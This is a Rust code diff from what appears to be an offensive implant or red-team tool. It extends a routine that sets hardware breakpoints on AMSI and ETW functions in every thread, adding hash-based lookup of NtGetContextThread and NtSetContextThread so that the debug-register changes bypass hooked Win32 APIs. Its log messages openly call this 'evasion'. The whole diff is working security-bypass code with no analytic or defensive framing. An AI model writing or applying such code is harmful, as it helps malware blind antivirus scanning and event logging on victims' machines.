@@ -126,6 +126,14 @@ pub unsafe fn setup_hardware_breakpoints() {
     };
     use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};
 
+    type NtGetContextThreadFn =
+        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtSetContextThreadFn =
+        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+
+    let mut nt_get_context_thread: Option<NtGetContextThreadFn> = None;
+    let mut nt_set_context_thread: Option<NtSetContextThreadFn> = None;
+
     let mut configured = false;
 
     let amsi: *mut winapi::ctypes::c_void =
@@ -150,6 +158,30 @@ pub unsafe fn setup_hardware_breakpoints() {
             ETW_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
         }
+
+        let nt_get_hash = pe_resolve::hash_str(b"NtGetContextThread\0");
+        let nt_set_hash = pe_resolve::hash_str(b"NtSetContextThread\0");
+
+        let nt_get_addr: *mut winapi::ctypes::c_void =
+            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_get_hash).unwrap_or(0) as _;
+        if !nt_get_addr.is_null() {
+            nt_get_context_thread = Some(std::mem::transmute(nt_get_addr));
+        }
+
+        let nt_set_addr: *mut winapi::ctypes::c_void =
+            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_set_hash).unwrap_or(0) as _;
+        if !nt_set_addr.is_null() {
+            nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
+        }
+    }
+
+    if nt_set_context_thread.is_some() {
+        log::debug!("evasion: using NtSetContextThread for debug register modification");
+    } else {
+        log::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
+        log::warn!(
+            "evasion: SetThreadContext fallback path in use for debug register modification"
+        );
     }
 
     if !configured {
@@ -180,12 +212,41 @@ pub unsafe fn setup_hardware_breakpoints() {
 
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-                        if GetThreadContext(h_thread, &mut ctx) != 0 {
+                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
+                            let status = nt_get_ctx(h_thread, &mut ctx);
+                            if status >= 0 {
+                                true
+                            } else {
+                                log::warn!(
+                                    "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to GetThreadContext",
+                                    te32.th32ThreadID,
+                                    status as u32
+                                );
+                                GetThreadContext(h_thread, &mut ctx) != 0
+                            }
+                        } else {
+                            GetThreadContext(h_thread, &mut ctx) != 0
+                        };
+
+                        if got_context {
                             ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
                             ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
                             // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                             ctx.Dr7 |= (1 << 0) | (1 << 2);
-                            SetThreadContext(h_thread, &ctx);
+
+                            if let Some(nt_set_ctx) = nt_set_context_thread {
+                                let status = nt_set_ctx(h_thread, &mut ctx);
+                                if status < 0 {
+                                    log::warn!(
+                                        "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
+                                        te32.th32ThreadID,
+                                        status as u32
+                                    );
+                                    SetThreadContext(h_thread, &ctx);
+                                }
+                            } else {
+                                SetThreadContext(h_thread, &ctx);
+                            }
                         }
 
                         ResumeThread(h_thread);
